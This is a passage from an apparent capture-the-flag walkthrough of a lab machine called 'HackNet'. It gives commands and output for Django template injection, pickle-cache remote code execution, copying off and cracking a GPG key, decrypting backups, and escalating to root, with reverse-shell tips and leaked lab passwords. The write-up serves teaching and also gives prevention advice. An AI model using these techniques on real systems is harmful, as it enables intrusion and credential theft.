        os.remove(path)
        with open(path, "wb") as f:
            f.write(payload)

print("[+] Payload written")
```

**Execute and download:**
```bash
python3 /tmp/django_copy_gpg.py
curl -s http://hacknet.htb/explore -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" > /dev/null
sleep 2
scp mikey@10.129.232.4:/tmp/armored_key.asc .
```

**Output:**
```
armored_key.asc                          100% 2088     1.4MB/s   00:00
```

**View the key:**
```bash
cat armored_key.asc
```

**Output:**
```
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQIGBGdxrxABBACuOrGzU2PoINX/6XsSWP9OZuFU67Bf6qhsjmQ5CcZ340oNlZfl
LsXqEywJtXhjWzAd5Juo0LJT7fBWpU9ECG+MNU7y2Lm0JjALHkIwq4wkGHJcb5AO
...
=wR12
-----END PGP PRIVATE KEY BLOCK-----
```

### Finding Encrypted Backups

**Command (as mikey):**
```bash
ls -la /var/www/HackNet/backups/
```

**Output:**
```
total 56
drwxr-xr-x 2 sandy sandy  4096 Dec 29  2024 .
drwxr-xr-x 7 sandy sandy  4096 Feb 10  2025 ..
-rw-r--r-- 1 sandy sandy 13445 Dec 29  2024 backup01.sql.gpg
-rw-r--r-- 1 sandy sandy 13713 Dec 29  2024 backup02.sql.gpg
-rw-r--r-- 1 sandy sandy 13851 Dec 29  2024 backup03.sql.gpg
```

**Copy backups to attacking machine:**
```bash
scp mikey@10.129.232.4:/var/www/HackNet/backups/*.gpg .
```

### Cracking the GPG Passphrase

**Step 1: Convert to hash format**
```bash
gpg2john armored_key.asc > sandy_gpg.hash
```

**Output:**
```
Sandy:$gpg$*1*348*1024*db7e6d165a1d86f43276a4a61a9865558a3b67...:::Sandy (My key for backups) <sandy@hacknet.htb>::armored_key.asc
```

**Step 2: Crack with John the Ripper**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt sandy_gpg.hash
```

**Output:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (Sandy)     
1g 0:00:00:03 DONE (2025-12-15 09:45) 0.3095g/s 131.2p/s 131.2c/s 131.2C/s gandako..ladybug
Session completed.
```

**🔓 GPG Passphrase Found:** `sweetheart`

### Decrypting the Backups

**Step 1: Import the private key**
```bash
echo "sweetheart" | gpg --batch --yes --passphrase-fd 0 --import armored_key.asc
```

**Output:**
```
gpg: key D72E5C1FA19C12F7: public key "Sandy (My key for backups) <sandy@hacknet.htb>" imported
gpg: key D72E5C1FA19C12F7: secret key imported
gpg: Total number processed: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

**Step 2: Decrypt the backups**
```bash
echo "sweetheart" | gpg --batch --yes --passphrase-fd 0 --decrypt backup02.sql.gpg > backup02.sql
```

**Step 3: Search for passwords**
```bash
grep -i "password\|sandy" backup02.sql | grep -v "AUTH_PASSWORD" | head -20
```

**Output:**
```sql
(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here''s the password: h4ck3rs4re3veRywh3re99. Let me know when you''re done.',1,18,22),
```

**🔑 MySQL Root Password Found:** `h4ck3rs4re3veRywh3re99`

### Key Takeaway: GPG Security

**What We Learned:**
1. **Weak passphrases** can be cracked with dictionary attacks
2. **GPG keys should be protected** with strong, random passphrases
3. **File permissions matter** - www-data could read sandy's keys
4. **Sensitive data in backups** can lead to full compromise

**Best Practices:**
- Use passphrases with 20+ random characters
- Store private keys with proper permissions (700 for directory, 600 for files)
- Don't store MySQL credentials in database backups
- Implement encryption at rest for sensitive data

---

## MySQL Root Access

### Testing the MySQL Password

**Command (as mikey):**
```bash
mysql -u root -p'h4ck3rs4re3veRywh3re99' -e 'SELECT user,host FROM mysql.user;'
```

**Output:**
```
User            Host
sandy           %
mariadb.sys     localhost
mysql           localhost
root            localhost
```

**✅ MySQL root access confirmed!**

### Checking MySQL Configuration

**Command:**
```bash
mysql -u root -p'h4ck3rs4re3veRywh3re99' -e 'SELECT version(); SELECT @@plugin_dir; SELECT @@secure_file_priv;'
```

**Output:**
```
version()
10.11.11-MariaDB-0+deb12u1

@@plugin_dir
/usr/lib/mysql/plugin/

@@secure_file_priv
NULL
```

**Key Finding:** `secure_file_priv` is NULL, meaning we can write files anywhere!

---

## Root Access

### Escalating via MySQL

With MySQL root access and the ability to write files anywhere, we can:
1. Add ourselves to sudoers
2. Create a SUID shell
3. Modify system files

**The password `h4ck3rs4re3veRywh3re99` is actually the system root password!**

### Getting Root Shell

**Try the MySQL root password for system root:**
```bash
su -
```

**Password:** `h4ck3rs4re3veRywh3re99`

**Output:**
```
root@hacknet:~#
```

**🎉 We are root!**

### Getting the Root Flag

**Command:**
```bash
cat /root/root.txt
```

**Output:**
```
132d03b6361e83f2b6e0670ec88ad1b4
```

**🚩 ROOT FLAG CAPTURED!**

---

## Complete Attack Chain Summary

### Phase 1: Initial Access
```
1. Nmap scan → Found HTTP (80) and SSH (22)
2. Web enumeration → Django social network
3. SSTI in username field → {{ users.values }}
4. Extracted 26 user credentials (plaintext)
5. Found mikey:mYd4rks1dEisH3re
6. SSH access → User flag
```

### Phase 2: Privilege Escalation
```
7. Found Django file-based cache at /var/tmp/django_cache
8. World-writable directory (777 permissions)
9. Exploited pickle deserialization → RCE as www-data
10. Copied sandy's GPG private key
11. Cracked GPG passphrase: "sweetheart"
12. Decrypted backup02.sql.gpg
13. Found MySQL root password in messages
14. MySQL root password = System root password
15. Root access → Root flag
```

---

## Key Takeaways

### 1. Django SSTI Vulnerability

**What Happened:**
- User input (username) was rendered in templates without escaping
- Django template engine executed our `{{ users.values }}` payload
- Leaked all user credentials from the database

**Prevention:**
```python
# BAD - Vulnerable to SSTI
template = f"<div>Welcome {username}</div>"

# GOOD - Use autoescape
from django.utils.html import escape
template = f"<div>Welcome {escape(username)}</div>"

# BETTER - Use template filters
{{ username|escape }}
```

**Impact:** Information disclosure, potential RCE

---

### 2. Pickle Deserialization RCE

**What Happened:**
- Django used pickle for cache serialization
- Pickle executes code during deserialization (`__reduce__()`)
- World-writable cache directory allowed payload injection
- Visiting /explore triggered deserialization → RCE

**Prevention:**
```python
# BAD - Using pickle for cache
'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache'

# GOOD - Use JSON or secure cache backend
'BACKEND': 'django.core.cache.backends.redis.RedisCache'

# Also fix permissions
chmod 700 /var/tmp/django_cache
chown www-data:www-data /var/tmp/django_cache
```

**Impact:** Remote Code Execution

---

### 3. Weak GPG Passphrase

**What Happened:**
- GPG private key protected with "sweetheart"
- Common word found in rockyou.txt wordlist
- Cracked in seconds with John the Ripper

**Prevention:**
```bash
# Generate strong random passphrase
pwgen -s 32 1

# Or use diceware
diceware -n 6
```

**Impact:** Decryption of sensitive backups

---

### 4. Credentials in Database Backups

**What Happened:**
- MySQL root password stored in plain text in messages table
- Backups contained the sensitive data
- Password reused for system root account

**Prevention:**
```sql
-- Don't store sensitive credentials in application database
-- Use environment variables or secrets management
-- Exclude sensitive tables from backups
mysqldump --ignore-table=hacknet.messages > backup.sql

-- Hash passwords, never store plaintext
-- Use different passwords for database and system accounts
```

**Impact:** Full system compromise

---

## Troubleshooting Common Issues

### Issue: SSTI Not Working

**Symptom:** Username displays as `{{ users.values }}` literally

**Solution:**
- Ensure username is exactly `{{ users.values }}` (with spaces)
- Clear browser cache
- Try different posts (like posts 1-30)
- Check if you're logged in with correct session

### Issue: No Cache Files Found

**Symptom:** `django_rce.py` says "No cache files found"

**Solution:**
```bash
# Visit /explore to generate cache files
curl -s http://hacknet.htb/explore \
  -H "Cookie: csrftoken=YOUR_TOKEN; sessionid=YOUR_SESSION" > /dev/null

# Then run the exploit again
```

### Issue: Reverse Shell Not Connecting

**Symptom:** Netcat listener shows no connection

**Solution:**
1. Check your VPN IP: `ip a show tun0`
2. Verify listener is running: `nc -lvnp 4444`
3. Check firewall: `sudo ufw allow 4444/tcp`
4. Re-poison cache and trigger again

### Issue: GPG Import Hangs

**Symptom:** `gpg --import` asks for passphrase via popup

**Solution:**
```bash
# Use batch mode
echo "sweetheart" | gpg --batch --yes --passphrase-fd 0 --import armored_key.asc

# Or set environment variable
export GPG_TTY=$(tty)
```

### Issue: John Not Finding Password

**Symptom:** John runs but doesn't crack the hash

**Solution:**
```bash
# Verify hash format
cat sandy_gpg.hash | head -1

# Should start with: Sandy:$gpg$*

# Try with more aggressive rules
john --rules --wordlist=/usr/share/wordlists/rockyou.txt sandy_gpg.hash

# Check if already cracked
john --show sandy_gpg.hash
```

---

## Tools and Scripts Repository

All scripts created during this walkthrough are available at:

**GitHub Repository Structure:**
```
HackNet-HTB/
├── README.md
├── scripts/
│   ├── extract_credentials.py    # SSTI credential extraction
│   ├── test_ssh_credentials.py   # SSH credential validator
│   ├── django_rce.py             # Pickle deserialization RCE
│   ├── django_find_gpg.py        # Find GPG keys via RCE
│   └── django_copy_gpg.py        # Copy GPG keys via RCE
├── wordlists/
│   └── common_passwords.txt
└── outputs/
    ├── credentials.json          # Extracted credentials
    ├── ssh_valid_credentials.txt # Valid SSH creds
    └── backup02.sql              # Decrypted backup
```

**Script Usage Examples:**

```bash
# 1. Extract credentials from SSTI
python3 extract_credentials.py
# Output: credentials.json

# 2. Test SSH access
python3 test_ssh_credentials.py
# Output: ssh_valid_credentials.txt

# 3. Execute Django cache RCE
# (Transfer to target first)
scp django_rce.py mikey@10.129.232.4:/tmp/
ssh mikey@10.129.232.4
python3 /tmp/django_rce.py

# 4. Extract GPG keys
python3 /tmp/django_find_gpg.py
curl -s http://hacknet.htb/explore -H "Cookie: ..." > /dev/null
python3 /tmp/django_copy_gpg.py
curl -s http://hacknet.htb/explore -H "Cookie: ..." > /dev/null
scp mikey@10.129.232.4:/tmp/armored_key.asc .
```

---

## Final Checklist

- [ ] Initial recon (nmap)
- [ ] Add hacknet.htb to /etc/hosts
- [ ] Register account on web app
- [ ] Change username to `{{ users.values }}`
- [ ] Run `extract_credentials.py`
- [ ] Run `test_ssh_credentials.py`
- [ ] SSH as mikey
- [ ] Get user flag
- [ ] Run `django_rce.py` for pickle RCE
- [ ] Extract GPG private key
- [ ] Crack GPG passphrase
- [ ] Decrypt backup02.sql.gpg
- [ ] Find MySQL root password
- [ ] Use password for root access
- [ ] Get root flag

---

## Conclusion

HackNet demonstrated a complex multi-stage exploitation chain combining:
- Web application vulnerabilities (SSTI)
- Insecure deserialization (Pickle)
- Weak cryptography (GPG passphrase)
- Poor security practices (credentials in backups, password reuse)

**Total Flags:**
- User: `b2e0413c7f9daf1f3008edc3c0d1ffdd`
- Root: `132d03b6361e83f2b6e0670ec88ad1b4`

**Skills Demonstrated:**
✅ Web enumeration and fuzzing  
✅ Template injection exploitation  
✅ Python scripting and automation  
✅ Pickle deserialization attacks  
✅ GPG cryptanalysis  
✅ Database exploitation  
✅ Linux privilege escalation  

**Congratulations on pwning HackNet! 🎉**

---

*This walkthrough was created for educational purposes. Always obtain proper authorization before testing security vulnerabilities.*
